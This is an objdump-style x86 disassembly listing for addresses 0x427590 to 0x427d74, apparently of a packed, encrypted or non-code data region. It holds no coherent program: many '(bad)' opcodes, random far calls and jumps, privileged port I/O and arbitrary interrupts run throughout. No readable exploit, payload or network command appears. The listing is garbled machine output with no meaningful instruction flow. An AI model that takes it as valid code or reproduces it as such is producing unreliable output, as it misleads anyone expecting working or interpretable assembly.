  427590:	je     0x4275d8
  427592:	imul   ebp,DWORD PTR [ebx-0x30],0xffffffef
  427596:	(bad)  
  427597:	addr16 loope 0x42753c
  42759a:	push   ss
  42759b:	xchg   ecx,eax
  42759c:	jmp    0xc7b5c609
  4275a1:	outs   dx,BYTE PTR ds:[esi]
  4275a2:	out    0xd2,al
  4275a4:	daa    
  4275a5:	cmp    dh,0x8f
  4275a8:	mov    ds:0x8a00a50a,al
  4275ad:	xchg   edx,eax
  4275ae:	cmp    ah,0xc2
  4275b1:	sti    
  4275b2:	mov    dl,0xbf
  4275b4:	or     al,0x9f
  4275b6:	jl     0x427561
  4275b8:	sbb    esi,DWORD PTR [ecx+0xb3f33b7]
  4275be:	mov    al,0x8f
  4275c0:	mov    ch,0x98
  4275c2:	inc    esp
  4275c3:	jb     0x42763e
  4275c5:	sbb    esi,0x16
  4275c8:	dec    edx
  4275c9:	mov    eax,0x3d173af9
  4275ce:	inc    ebp
  4275cf:	sti    
  4275d0:	fwait
  4275d1:	push   cs
  4275d2:	fwait
  4275d3:	mov    BYTE PTR [esi+eax*1+0x79],ch
  4275d7:	push   cs
  4275d8:	cmp    al,BYTE PTR [esi]
  4275da:	xlat   BYTE PTR ds:[ebx]
  4275db:	inc    edi
  4275dc:	cs js  0x427594
  4275df:	jb     0x427594
  4275e1:	push   0xf78956c5
  4275e6:	sub    DWORD PTR [ecx],ebp
  4275e8:	sub    edi,DWORD PTR [edx]
  4275ea:	pushf  
  4275eb:	jb     0x427640
  4275ed:	ds (bad) 
  4275ef:	aam    0xf8
  4275f1:	(bad)
  4275f5:	js     0x42762c
  4275f7:	sub    edx,DWORD PTR [edi]
  4275f9:	push   eax
  4275fa:	dec    ebx
  4275fb:	mov    BYTE PTR [eax-0x45e92c2c],dh
  427601:	rol    DWORD PTR [edi-0x14],cl
  427604:	pop    ebp
  427605:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427606:	and    bl,BYTE PTR [eax+0x4967f6a7]
  42760c:	push   edx
  42760d:	aam    0x3
  42760f:	xchg   edx,eax
  427610:	dec    ebx
  427611:	inc    eax
  427612:	fdiv   QWORD PTR [esi]
  427614:	push   0x4457f994
  427619:	pop    edx
  42761a:	push   esi
  42761b:	shr    DWORD PTR [ebx+0x35],0x82
  42761f:	push   edi
  427620:	call   0x62c3:0x536b7803
  427627:	rol    BYTE PTR [edx+0x77deb11a],1
  42762d:	adc    al,0x4
  42762f:	dec    ebp
  427630:	(bad)  
  427631:	in     eax,dx
  427632:	xor    ecx,ecx
  427634:	adc    al,0xb5
  427636:	add    BYTE PTR [eax+0x7d],cl
  427639:	jmp    0x4275c4
  42763b:	lahf   
  42763c:	test   BYTE PTR [esi-0x752cfca3],al
  427642:	pop    esp
  427643:	sbb    al,0x1c
  427645:	fwait
  427646:	outs   dx,DWORD PTR ds:[esi]
  427647:	push   edi
  427648:	push   eax
  427649:	inc    edi
  42764a:	aad    0x89
  42764c:	mov    esi,0x21854284
  427651:	pop    ebx
  427652:	pushf  
  427653:	retf   0x137b
  427656:	push   ds
  427657:	sub    al,0x13
  427659:	and    al,0xd2
  42765b:	push   cs
  42765c:	xchg   esi,eax
  42765d:	call   0xb262:0x3d2bd079
  427664:	push   esp
  427665:	adc    bl,bl
  427667:	ret    0xe444
  42766a:	xchg   edx,eax
  42766b:	sub    al,BYTE PTR [ecx-0x33]
  42766e:	lods   al,BYTE PTR ds:[esi]
  42766f:	fs idiv dl
  427672:	pop    ebx
  427673:	add    dl,BYTE PTR [eax-0x403a4830]
  427679:	in     al,dx
  42767a:	repnz daa 
  42767c:	or     BYTE PTR [esi+0x7a],0x96
  427680:	jl     0x4276a3
  427682:	sub    ah,al
  427684:	int    0xf4
  427686:	inc    edi
  427687:	scas   eax,DWORD PTR es:[edi]
  427688:	jns    0x427636
  42768a:	push   ecx
  42768b:	mov    bh,0xfa
  42768d:	pusha  
	...
  42769a:	cdq    
  42769b:	enter  0x9ff8,0xf9
  42769f:	mov    edi,0xcf7dceff
  4276a4:	stc    
  4276a5:	popf   
  4276a6:	xchg   edx,eax
  4276a7:	sahf   
  4276a8:	imul   BYTE PTR [ebx+0x1ec34]
  4276ae:	cld    
  4276af:	add    DWORD PTR [eax],eax
  4276b1:	add    BYTE PTR [esi],dh
  4276b3:	mov    dl,0xbf
  4276b5:	std    
  4276b6:	add    DWORD PTR [edi-0x57aab2dc],ebp
  4276bc:	jmp    0x4276f4
  4276be:	lds    ecx,FWORD PTR ds:0x2d7736b9
  4276c4:	mov    esp,0x89f93444
  4276c9:	pop    ds
  4276ca:	cmp    eax,0xf62d8554
  4276cf:	std    
  4276d0:	fs push cs
  4276d2:	nop
  4276d3:	test   al,0x0
  4276d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4276d6:	fist   WORD PTR [esi+0x2e]
  4276d9:	(bad)  
  4276da:	daa    
  4276db:	xchg   ah,dh
  4276dd:	jno    0x4276ef
  4276df:	sub    eax,0xb38d3547
  4276e4:	sbb    al,BYTE PTR [eax]
  4276e6:	cmp    eax,0x2ca57c76
  4276eb:	aam    0x88
  4276ed:	clc    
  4276ee:	xor    DWORD PTR [ebp-0x7c7ffa77],ecx
  4276f4:	scas   al,BYTE PTR es:[edi]
  4276f5:	adc    esp,DWORD PTR [edx]
  4276f7:	pop    edx
  4276f8:	addr16 fcmovne st,st(5)
  4276fb:	sub    DWORD PTR [edx-0x1e85d2a2],0x32
  427702:	cs push ds
  427704:	(bad)  
  427706:	and    dl,BYTE PTR [ebx]
  427708:	rcl    DWORD PTR [esi],0x5e
  42770b:	jmp    0xc396:0xc0df0809
  427712:	shr    DWORD PTR [edx+0x50],cl
  427715:	fwait
  427716:	dec    ebp
  427717:	arpl   si,ax
  427719:	mov    esi,0xc3439613
  42771e:	addr16 jno 0x427760
  427721:	icebp  
  427722:	jecxz  0x4276f7
  427724:	push   ds
  427725:	fcom   QWORD PTR [ebp+0x61]
  427728:	outs   dx,BYTE PTR ds:[esi]
  427729:	pop    ebp
  42772a:	adc    cl,BYTE PTR [ebp-0x72db7637]
  427730:	pusha  
  427731:	mov    bh,0x26
  427733:	fld    TBYTE PTR [ebx+0x734a0f4f]
  427739:	or     al,0x65
  42773b:	push   ds
  42773c:	js     0x4276fd
  42773e:	repnz hlt 
  427740:	jno    0x427754
  427742:	jmp    0x4276f9
  427744:	jb     0x427733
  427746:	bound  esi,QWORD PTR [ecx+0x26b619bd]
  42774c:	pop    ds
  42774d:	inc    ebx
  42774e:	mov    ecx,0xadd2ecd5
  427753:	jb     0x427744
  427755:	inc    esi
  427756:	jmp    0xb8d7:0x96f9befc
  42775d:	ds ins DWORD PTR es:[edi],dx
  42775f:	jo     0x427709
  427761:	es out dx,al
  427763:	jp     0x4277d3
  427765:	mov    al,ds:0x4529921d
  42776a:	jle    0x42771f
  42776c:	js     0x42771e
  42776e:	loope  0x427709
  427770:	push   0x5537ff4
  427775:	add    DWORD PTR [eax],ebp
  427777:	sbb    al,0xf8
  427779:	add    ebx,esp
  42777b:	xor    BYTE PTR ds:0xae0327a2,al
  427781:	call   0x623a2a4c
  427786:	cdq    
  427787:	vpaddd ymm7,ymm5,YMMWORD PTR [esi]
  42778b:	int    0x71
  42778d:	dec    edi
  42778e:	mov    ecx,0x73b27687
  427793:	push   esi
  427794:	cld    
  427795:	jg     0x42779f
  427797:	ret    
  427798:	test   BYTE PTR [ecx+0x40],0x3d
  42779c:	in     al,dx
  42779d:	das    
  42779e:	mov    ebp,0x8e2a2b95
  4277a3:	adc    ah,BYTE PTR [edi+0x7e]
  4277a6:	ret    
  4277a7:	stc    
  4277a8:	imul   edx,DWORD PTR ds:0x9fdb68a7,0x8de6cc22
  4277b2:	adc    DWORD PTR [eax],ebp
  4277b4:	data16 (bad) 
  4277b6:	fwait
  4277b7:	imul   eax,DWORD PTR [edi-0x6d3403ab],0xd99836db
  4277c1:	jnp    0x427840
  4277c3:	in     al,dx
  4277c4:	inc    esp
  4277c5:	mov    ebp,0xf2a89350
  4277ca:	xor    BYTE PTR [esi-0x66],al
  4277cd:	jp     0x4277d5
  4277cf:	aad    0x8d
  4277d1:	push   esp
  4277d2:	jmp    0x427817
  4277d4:	rol    BYTE PTR [ecx+eiz*1+0x1f],cl
  4277d8:	(bad)  
  4277d9:	out    0x5f,al
  4277db:	xor    BYTE PTR [ebx+0x1ec67d59],bh
  4277e1:	inc    ebx
  4277e2:	(bad)  
  4277e3:	(bad)  
  4277e4:	repz xor bl,BYTE PTR [edi+0x7c9d9f59]
  4277eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4277ec:	sar    edx,1
  4277ee:	or     edx,0xffffffbf
  4277f1:	mov    DWORD PTR [ebp-0x192cd0c3],eax
  4277f7:	push   ebx
  4277f8:	push   cs
  4277f9:	repnz in al,dx
  4277fb:	xchg   ebx,eax
  4277fc:	dec    edi
  4277fd:	pop    ebp
  4277fe:	mov    ah,dh
  427800:	mov    ebx,0x848a09a8
  427805:	arpl   WORD PTR [esi-0x6b],si
  427808:	xchg   edi,eax
  427809:	jl     0x42787c
  42780b:	pop    edx
  42780c:	scas   al,BYTE PTR es:[edi]
  42780d:	lock aaa 
  42780f:	push   edx
  427810:	jge    0x427838
  427812:	fwait
  427813:	cld    
  427814:	jmp    0x6541:0xe8f37978
  42781b:	push   ebp
  42781c:	push   ecx
  42781d:	mov    edi,0x421fada8
  427822:	or     ebx,DWORD PTR [edx+0x39]
  427825:	in     al,dx
  427826:	jl     0x42787c
  427828:	inc    ecx
  427829:	imul   BYTE PTR [edx-0x4e070bd1]
  42782f:	scas   al,BYTE PTR es:[edi]
  427830:	push   cs
  427831:	push   edi
  427832:	fistp  QWORD PTR [edi]
  427834:	rcl    BYTE PTR [esi+0x19],1
  427837:	mov    ebp,0x820c1675
  42783c:	faddp  st(1),st
  42783e:	jle    0x4278b4
  427840:	lods   al,BYTE PTR ds:[esi]
  427841:	add    bh,BYTE PTR [eax-0x60676ad0]
  427847:	jnp    0x427814
  427849:	lods   eax,DWORD PTR ds:[esi]
  42784a:	xchg   BYTE PTR [eax+edx*8],ch
  42784d:	int3   
  42784e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42784f:	fsub   DWORD PTR [ebp+0x5f14c970]
  427855:	outs   dx,DWORD PTR ds:[esi]
  427856:	fcom   QWORD PTR [ebx+0x71]
  427859:	xor    DWORD PTR [ebx+0x36abb01e],0xa9cafac6
  427863:	push   eax
  427864:	jo     0x42789d
  427866:	lahf   
  427867:	cwde   
  427868:	fcmovne st,st(2)
  42786a:	jl     0x4278e8
  42786c:	sbb    BYTE PTR [esi+0x54],bl
  42786f:	scas   eax,DWORD PTR es:[edi]
  427870:	fstp   DWORD PTR [ebx+0x25]
  427873:	pop    ebx
  427874:	pop    ecx
  427875:	dec    edx
  427876:	popa   
  427877:	xchg   esi,eax
  427878:	leave  
  427879:	cmp    BYTE PTR [ecx-0x3d],bl
  42787c:	loopne 0x4278cd
  42787e:	mov    ebp,0x5008c78b
  427883:	iret   
  427884:	jne    0x42783a
  427886:	pushf  
  427887:	add    eax,0x56cac7df
  42788c:	mov    ch,0xd4
  42788e:	enter  0x61f5,0x92
  427892:	call   0x6c87:0xe3fe6b28
  427899:	push   edi
  42789a:	mov    edx,0x8d85813c
  42789f:	pop    eax
  4278a0:	xchg   ebp,eax
  4278a1:	inc    esp
  4278a2:	lods   eax,DWORD PTR ds:[esi]
  4278a3:	sti    
  4278a4:	add    esi,DWORD PTR [edx+0x11]
  4278a7:	ret    
  4278a8:	test   DWORD PTR [ebp+0x621dde83],ecx
	...
  4278ba:	jns    0x4278c6
  4278bc:	sbb    BYTE PTR gs:[edi+0x7f],dh
  4278c0:	jge    0x42792d
  4278c2:	and    DWORD PTR [ebp+0x30],ecx
  4278c5:	dec    esi
  4278c6:	xchg   ebx,eax
  4278c7:	and    ebp,eax
  4278c9:	repnz xor dh,ch
  4278cc:	add    DWORD PTR [eax],eax
  4278ce:	cld    
  4278cf:	add    DWORD PTR [eax],eax
  4278d1:	add    bl,al
  4278d3:	xor    al,BYTE PTR [eax]
  4278d5:	sub    WORD PTR [esp+edi*4],di
  4278d9:	pop    es
  4278da:	push   esi
  4278db:	inc    edx
  4278dc:	mov    ch,0x83
  4278de:	leave  
  4278df:	daa    
  4278e0:	out    0x5a,al
  4278e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4278e3:	mov    cl,0x2
  4278e5:	mov    ecx,0x49da46bb
  4278ea:	ror    ebp,1
  4278ec:	sub    BYTE PTR [edx+0x74],al
  4278ef:	test   BYTE PTR [edx-0x3a],al
  4278f2:	ret    0x1f4d
  4278f5:	mov    dl,0x16
  4278f7:	xchg   esp,eax
  4278f8:	pop    ss
  4278f9:	pop    ds
  4278fa:	lds    ebp,FWORD PTR [ecx+ebp*8+0x2bbf7bc4]
  427901:	jmp    0x4567:0x17def86e
  427908:	jo     0x4278e4
  42790a:	push   ebx
  42790b:	jge    0x427906
  42790d:	outs   dx,BYTE PTR ds:[esi]
  42790e:	into   
  42790f:	idiv   DWORD PTR [ebx+ebp*4+0x4f88a83b]
  427916:	jp     0x427906
  427918:	outs   dx,DWORD PTR ds:[esi]
  427919:	fs stos BYTE PTR es:[edi],al
  42791b:	ret    0x5f89
  42791e:	and    al,0x7f
  427920:	into   
  427921:	mov    ds:0x3d4c33d9,al
  427926:	gs push ds
  427928:	loopne 0x4278db
  42792a:	push   edi
  42792b:	shr    BYTE PTR [ebx-0x7fe6785b],0x8f
  427932:	xchg   esp,eax
  427933:	jp     0x427974
  427935:	mov    edi,0xa85e7724
  42793a:	out    0xdd,eax
  42793c:	mov    ch,0xf6
  42793e:	int3   
  42793f:	adc    DWORD PTR [edi-0x6d],0x32
  427943:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427944:	test   BYTE PTR [edx],0x7d
  427947:	mov    DWORD PTR [ebp-0x14],esi
  42794a:	inc    ecx
  42794b:	sub    al,0xbb
  42794d:	xor    eax,0x3faa2843
  427952:	into   
  427953:	test   eax,0x37c5ba13
  427958:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42795a:	mov    al,0x65
  42795c:	xor    eax,DWORD PTR [eax-0x2a]
  42795f:	out    dx,eax
  427960:	out    0x32,al
  427962:	sahf   
  427963:	sahf   
  427964:	sbb    bl,BYTE PTR [esi+ecx*2]
  427967:	mov    ds:0x42eb19fe,al
  42796c:	mul    WORD PTR [ebp-0x4b]
  427970:	mov    bh,0x2b
  427972:	mov    ds:0x256f542a,eax
  427977:	mov    dl,0x8
  427979:	aam    0x18
  42797b:	aad    0xa5
  42797d:	dec    edx
  42797e:	adc    DWORD PTR [ecx+ecx*8+0x4a],0x75
  427983:	neg    edx
  427985:	std    
  427986:	or     dl,BYTE PTR [esi+0x14d0c39a]
  42798c:	pop    ss
  42798d:	pop    ebx
  42798e:	(bad)  
  42798f:	call   0x3ac5:0x10f54ee7
  427996:	push   edx
  427997:	aad    0x50
  427999:	fnstsw WORD PTR [edx-0x31]
  42799c:	leave  
  42799d:	mov    bl,0xea
  42799f:	xchg   ecx,eax
  4279a0:	arpl   WORD PTR [edx-0x6465b631],ax
  4279a6:	retf   
  4279a7:	data16 or BYTE PTR [ecx-0x1c],al
  4279ab:	in     al,0x49
  4279ad:	mov    dh,0x5b
  4279af:	sbb    DWORD PTR [ecx+0x6a],0xfffffff9
  4279b3:	out    dx,al
  4279b4:	out    dx,al
  4279b5:	fadd   DWORD PTR [ecx+eiz*2-0x2b]
  4279b9:	(bad)  
  4279ba:	xor    dl,bl
  4279bc:	add    dl,BYTE PTR [ebp-0x28]
  4279bf:	lock out 0xf7,al
  4279c2:	daa    
  4279c3:	inc    esi
  4279c4:	inc    edx
  4279c5:	adc    esi,0x48
  4279c8:	push   eax
  4279c9:	rol    BYTE PTR [eax],1
  4279cb:	and    al,BYTE PTR [edi-0x24]
  4279ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4279cf:	cmp    al,0x66
  4279d1:	jo     0x427961
  4279d3:	xor    eax,0xa8349a
  4279d8:	call   0xd82a9764
  4279dd:	pop    ds
  4279de:	pushf  
  4279df:	fld    DWORD PTR [edi]
  4279e1:	push   ecx
  4279e2:	into   
  4279e3:	in     al,dx
  4279e4:	in     eax,dx
  4279e5:	add    DWORD PTR [eax-0x74],esp
  4279e8:	xchg   ebx,eax
  4279e9:	les    eax,FWORD PTR ds:0xb7c15896
  4279ef:	pop    eax
  4279f0:	cmc    
  4279f1:	push   esp
  4279f2:	inc    eax
  4279f3:	or     eax,0x1ddac5d6
  4279f8:	xchg   esi,eax
  4279f9:	or     eax,0x60c544a3
  4279fe:	cmp    DWORD PTR [eax-0x34],ebx
  427a01:	shr    edi,1
  427a03:	mov    WORD PTR [esi-0x717d5dea],fs
  427a09:	stos   BYTE PTR es:[edi],al
  427a0a:	fisub  DWORD PTR [ebx-0x3d1ba901]
  427a10:	out    dx,al
  427a11:	or     DWORD PTR [edx-0x4b7a7e9a],edx
  427a17:	dec    eax
  427a18:	(bad)  
  427a1a:	fs cli 
  427a1c:	or     bl,dh
  427a1e:	test   BYTE PTR [ecx-0x2f],ah
  427a21:	loopne 0x427a85
  427a23:	ja     0x427a2f
  427a25:	inc    ecx
  427a26:	ss mov bh,0xa2
  427a29:	jae    0x427a82
  427a2b:	repz or bl,BYTE PTR [esp+ebx*2+0x6b8dba2a]
  427a33:	das    
  427a34:	push   0x1de3c91a
  427a39:	(bad)  
  427a3a:	mov    edi,DWORD PTR [eax+0x36a2c8fb]
  427a40:	fdiv   QWORD PTR [edx+0x28]
  427a43:	push   ebp
  427a44:	mov    esp,0x5844a956
  427a4a:	fucom  st(7)
  427a4c:	clc    
  427a4d:	mov    eax,ds:0xc0d5c340
  427a52:	hlt    
  427a53:	inc    DWORD PTR [edx]
  427a55:	or     eax,0xe81abfb6
  427a5a:	scas   al,BYTE PTR es:[edi]
  427a5b:	(bad)  [eax+0x4a]
  427a5e:	or     edi,edi
  427a60:	add    eax,0x59376408
  427a65:	xchg   ecx,eax
  427a66:	int    0x92
  427a68:	enterw 0xd22,0xd8
  427a6d:	xor    BYTE PTR [ebp-0x214c3bcd],dl
  427a73:	test   DWORD PTR [ecx-0x33045164],ebx
  427a79:	int    0x78
  427a7b:	sbb    BYTE PTR [edx+eiz*8+0x4c230cb2],0x84
  427a83:	inc    BYTE PTR [ecx]
  427a85:	adc    eax,0x5487afe8
  427a8a:	dec    eax
  427a8b:	mov    al,0x2e
  427a8d:	xchg   esi,eax
  427a8e:	imul   eax,DWORD PTR [esi],0x5087137e
  427a94:	cmp    eax,0x64c0a243
  427a99:	jno    0x427a29
  427a9b:	adc    cl,BYTE PTR [ebx-0x502a1e84]
  427aa1:	add    dh,BYTE PTR [ecx-0x3eefcaa5]
  427aa7:	mov    ds:0x34fe1041,al
  427aac:	dec    ebp
  427aad:	sbb    al,0x83
  427aaf:	std    
  427ab0:	push   edi
  427ab1:	adc    al,0x4e
  427ab3:	int3   
  427ab4:	fisubr DWORD PTR [edx-0x205e7670]
  427aba:	rcr    DWORD PTR [edi+0x5c9caa17],0x97
  427ac1:	cld    
  427ac2:	lds    esp,FWORD PTR [ebp+0x29070ea2]
  427ac8:	jge    0x427b02
  427aca:	in     eax,dx
  427acb:	fdivr  DWORD PTR [ebx-0x61]
	...
  427ada:	pop    ecx
  427adb:	add    eax,ecx
  427add:	inc    esp
  427ade:	fcmovnb st,st(6)
  427ae0:	fstp   QWORD PTR [edi]
  427ae2:	arpl   WORD PTR [edi+0x1ff64d6c],di
  427ae8:	shl    DWORD PTR [esp+ebp*1-0x3fffe10],0x1
  427af0:	add    BYTE PTR [eax],al
  427af2:	sti    
  427af3:	add    DWORD PTR [esi+0x17c48e19],ebx
  427af9:	shl    ah,1
  427afb:	stos   DWORD PTR es:[edi],eax
  427afc:	fisttp WORD PTR [edi]
  427afe:	shl    esp,0xe6
  427b01:	or     dh,dh
  427b03:	or     DWORD PTR [ebp-0xd],esi
  427b06:	fcmove st,st(5)
  427b08:	cdq    
  427b09:	int    0x84
  427b0b:	mov    cl,0xfd
  427b0d:	mov    ds:0xe7836094,eax
  427b12:	add    BYTE PTR [edx],ah
  427b14:	clc    
  427b15:	jp     0x427b6e
  427b17:	in     eax,0x18
  427b19:	add    al,BYTE PTR [edx+0x3a8e6bf2]
  427b1f:	ror    DWORD PTR [edx+0x4e],1
  427b22:	adc    al,0x93
  427b24:	dec    edx
  427b25:	fdiv   QWORD PTR [ecx-0x6205d086]
  427b2b:	(bad)  
  427b2d:	cmp    ebp,DWORD PTR ds:0xdf05cc81
  427b33:	jg     0x427b94
  427b35:	fld    DWORD PTR [esp+ebx*2-0x62]
  427b39:	js     0x427b35
  427b3b:	cmp    al,0xd2
  427b3d:	mov    ah,0xb9
  427b3f:	pop    esi
  427b40:	loop   0x427b1c
  427b42:	fcmovnu st,st(2)
  427b44:	mov    eax,ds:0xef180cb5
  427b49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427b4a:	add    DWORD PTR [ecx],esp
  427b4c:	jge    0x427b40
  427b4e:	lds    edi,FWORD PTR ds:[ebp+ecx*4+0x59110d0e]
  427b56:	push   esi
  427b57:	pop    ebp
  427b58:	mov    ebx,0x52aa2995
  427b5d:	jo     0x427b03
  427b5f:	xchg   dh,ah
  427b61:	sub    DWORD PTR [ecx],ecx
  427b63:	repnz push eax
  427b65:	dec    ebp
  427b66:	cmp    eax,0x251d5158
  427b6b:	fadd   DWORD PTR [eax]
  427b6d:	clc    
  427b6e:	repnz in eax,dx
  427b70:	je     0x427b19
  427b72:	push   ecx
  427b73:	adc    eax,ecx
  427b75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427b76:	mov    esp,0x15ae4690
  427b7b:	(bad)  
  427b7c:	ins    DWORD PTR es:[edi],dx
  427b7d:	retf   0x43ee
  427b80:	lds    ecx,FWORD PTR [esp+esi*2]
  427b83:	sub    BYTE PTR [edx+0x4bb4033],bh
  427b89:	pushf  
  427b8a:	or     eax,0xcc9b0861
  427b8f:	jmp    0xfd9d:0xfd100714
  427b96:	test   BYTE PTR [ecx],dl
  427b98:	mov    ebx,0xaa07ec54
  427b9d:	fnstenv [ebx]
  427b9f:	ins    BYTE PTR es:[edi],dx
  427ba0:	outs   dx,BYTE PTR ds:[esi]
  427ba1:	push   0x6d8bb917
  427ba6:	in     eax,dx
  427ba7:	loope  0x427bde
  427ba9:	push   eax
  427baa:	mov    ds:0x4f7f11ce,al
  427baf:	mov    esi,0x88538ce7
  427bb4:	pushf  
  427bb5:	xchg   ebp,eax
  427bb6:	sub    bh,al
  427bb8:	pushfw 
  427bba:	mov    dh,0xf1
  427bbc:	ss (bad) 
  427bbe:	stos   BYTE PTR es:[edi],al
  427bbf:	adc    BYTE PTR [edx-0x4293a606],bh
  427bc5:	mov    ds:0x7695e3d8,al
  427bca:	aad    0x24
  427bcc:	fisttp DWORD PTR [ebx+0x1f52c67f]
  427bd2:	(bad)  
  427bd4:	push   edx
  427bd5:	sub    DWORD PTR [esi+0x7f1bdff6],esp
  427bdb:	fsubp  st(4),st
  427bdd:	ds jle 0x427c4f
  427be0:	push   eax
  427be1:	jecxz  0x427c07
  427be3:	mov    bl,0x54
  427be5:	sub    DWORD PTR [ecx],0x6a00d59e
  427beb:	je     0x427c6c
  427bed:	jo     0x427b90
  427bef:	pop    ebx
  427bf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427bf1:	adc    eax,0x41087b4b
  427bf6:	mov    al,0x0
  427bf8:	pop    ebp
  427bf9:	dec    eax
  427bfa:	addr16 cmp edx,esi
  427bfd:	stc    
  427bfe:	(bad)  
  427bff:	int    0xed
  427c01:	fwait
  427c02:	nop
  427c03:	and    eax,0x84ee3c32
  427c08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427c09:	add    cl,dh
  427c0b:	dec    ecx
  427c0c:	adc    BYTE PTR [ecx+0x77],ah
  427c0f:	dec    ebp
  427c10:	dec    edi
  427c11:	aas    
  427c12:	outs   dx,DWORD PTR ds:[esi]
  427c13:	test   dl,bl
  427c15:	aad    0x62
  427c17:	push   ss
  427c18:	stc    
  427c19:	mov    ebx,0xbef8f18a
  427c1e:	pop    ebx
  427c1f:	test   ebx,eax
  427c21:	dec    ecx
  427c22:	sub    BYTE PTR [ecx+0x2d6c4bdc],dh
  427c28:	cmp    DWORD PTR [esi],edi
  427c2a:	mov    edx,0x3b25b681
  427c2f:	mov    eax,0xd0e7313b
  427c34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427c35:	fisttp QWORD PTR [eax]
  427c37:	dec    eax
  427c38:	lds    edx,FWORD PTR [eax-0x4996d71d]
  427c3e:	mov    DWORD PTR [edx],esi
  427c40:	ss pop ebx
  427c42:	jbe    0x427c08
  427c44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427c45:	xchg   esi,eax
  427c46:	adc    esp,ebx
  427c48:	data16 arpl WORD PTR [ebx],dx
  427c4b:	inc    ebx
  427c4c:	mov    cl,0x15
  427c4e:	jmp    0x427c10
  427c50:	xor    dh,ch
  427c52:	xchg   ebx,eax
  427c53:	mov    bl,0x67
  427c55:	mov    ebp,gs
  427c57:	icebp  
  427c58:	adc    ebp,DWORD PTR [esi]
  427c5a:	or     DWORD PTR [ebp+0xe6dea28],edx
  427c60:	push   edx
  427c61:	adc    BYTE PTR [edi+0x3b0abba2],al
  427c67:	push   0xfffffffb
  427c69:	popf   
  427c6a:	fld    QWORD PTR [ebp+0x5bc7a293]
  427c70:	and    eax,0x413f7882
  427c75:	mov    edx,ecx
  427c77:	leave  
  427c78:	test   esi,0x503897a5
  427c7e:	int3   
  427c7f:	jecxz  0x427c5e
  427c81:	dec    edx
  427c82:	jno    0x427c61
  427c84:	stos   BYTE PTR es:[edi],al
  427c85:	ficomp DWORD PTR [esi]
  427c87:	jo     0x427d08
  427c89:	pop    edx
  427c8a:	pop    esp
  427c8b:	outs   dx,BYTE PTR ds:[esi]
  427c8c:	and    esp,DWORD PTR [edx+0x40]
  427c8f:	push   eax
  427c90:	sub    bh,BYTE PTR [ecx+0x828b98e]
  427c96:	jge    0x427c93
  427c98:	ror    BYTE PTR [edx],cl
  427c9a:	adc    bl,BYTE PTR [ebx]
  427c9c:	mov    bl,0x6b
  427c9e:	mov    edi,0xd6ce1f52
  427ca3:	popf   
  427ca4:	aas    
  427ca5:	xor    esi,DWORD PTR [eax]
  427ca7:	xor    ecx,DWORD PTR [ebp-0x33885af1]
  427cad:	(bad)  
  427caf:	clc    
  427cb0:	ret    
  427cb1:	pusha  
  427cb2:	ins    BYTE PTR es:[edi],dx
  427cb3:	push   es
  427cb4:	adc    esi,edx
  427cb6:	xchg   ebp,eax
  427cb7:	xchg   ebp,eax
  427cb8:	fstp   DWORD PTR [ebx]
  427cba:	loopne 0x427ccd
  427cbc:	or     BYTE PTR [ebx-0x6f],dl
  427cbf:	dec    ebp
  427cc0:	mov    bl,0x2f
  427cc2:	bound  eax,QWORD PTR ds:0x57cedf71
  427cc8:	stc    
  427cc9:	xor    ch,cl
  427ccb:	xor    eax,0xb9464e82
  427cd0:	cmp    eax,0x496e4e54
  427cd5:	xor    BYTE PTR [edx-0x40d784d3],cl
  427cdb:	push   eax
  427cdc:	shr    bh,1
  427cde:	dec    edx
  427cdf:	out    0x79,al
  427ce1:	sub    DWORD PTR [esi+esi*4+0x26],esi
  427ce5:	jbe    0x427d2b
  427ce7:	add    eax,0xcb4fdc60
  427cec:	daa    
  427ced:	lahf   
	...
  427cfa:	sbb    esp,DWORD PTR [edi]
  427cfc:	pushf  
  427cfd:	cli    
  427cfe:	mov    esp,0xaae77ffb
  427d03:	xchg   esp,eax
  427d04:	out    dx,eax
  427d05:	cdq    
  427d06:	call   0x1f2:0x28ca43c0
  427d0d:	add    ah,bh
  427d0f:	add    DWORD PTR [eax],eax
  427d11:	add    BYTE PTR [esp+ebp*1+0x5f],al
  427d15:	das    
  427d16:	sub    al,BYTE PTR [ebx+0x12]
  427d19:	xlat   BYTE PTR ds:[ebx]
  427d1a:	xchg   ebp,eax
  427d1b:	popf   
  427d1c:	(bad)  
  427d1d:	jl     0x427d2c
  427d1f:	cwde   
  427d20:	gs lahf 
  427d22:	xchg   DWORD PTR [ebx-0x39],esi
  427d25:	push   edx
  427d26:	jmp    DWORD PTR [ecx-0x3794467b]
  427d2c:	pop    ebp
  427d2d:	hlt    
  427d2e:	imul   dl
  427d30:	aad    0xec
  427d32:	mov    bl,0xd8
  427d34:	mov    cl,0x6
  427d36:	out    0x9f,al
  427d38:	shl    dh,0x9d
  427d3b:	inc    ecx
  427d3c:	sbb    al,0x52
  427d3e:	xchg   ecx,eax
  427d3f:	sahf   
  427d40:	cmp    dl,BYTE PTR [esi+0x7f]
  427d43:	pop    ss
  427d44:	rol    DWORD PTR [esi],cl
  427d46:	xchg   ebx,eax
  427d47:	enter  0x207f,0xa6
  427d4b:	int    0x25
  427d4d:	cmp    dl,0x24
  427d50:	xor    dh,BYTE PTR [eax-0x66]
  427d53:	aad    0xfb
  427d55:	dec    ebp
  427d56:	in     al,0x66
  427d58:	call   0x98b:0x82664005
  427d5f:	cmp    edx,DWORD PTR [eax+eiz*1]
  427d62:	lock cmp bl,dh
  427d65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427d66:	push   ebp
  427d67:	inc    esi
  427d68:	iret   
  427d69:	sbb    eax,0xb7fa9202
  427d6e:	add    al,BYTE PTR [ecx+0x35]
  427d71:	call   FWORD PTR [ebx-0xd]
  427d74:	jge    0x427d01
